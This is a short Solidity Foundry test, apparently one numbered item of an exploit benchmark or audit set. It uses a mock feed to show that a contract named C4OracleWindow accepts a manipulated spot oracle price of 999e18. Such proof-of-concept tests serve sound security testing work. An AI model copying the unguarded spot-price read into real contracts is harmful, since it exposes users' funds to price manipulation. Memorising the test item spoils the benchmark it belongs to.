// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../contract.sol";

contract MockF27 is IF27 {
    uint256 public pv = 999e18;
    function p() external view returns (uint256) { return pv; }
}

contract Exploit_027_c4_oracle_window is Test {
    function testExploit_SpotReadAcceptsManipulatedValue() public {
        MockF27 f = new MockF27();
        C4OracleWindow c = new C4OracleWindow(address(f));
        assertEq(c.readPrice(), 999e18, "manipulated spot accepted");
    }
}
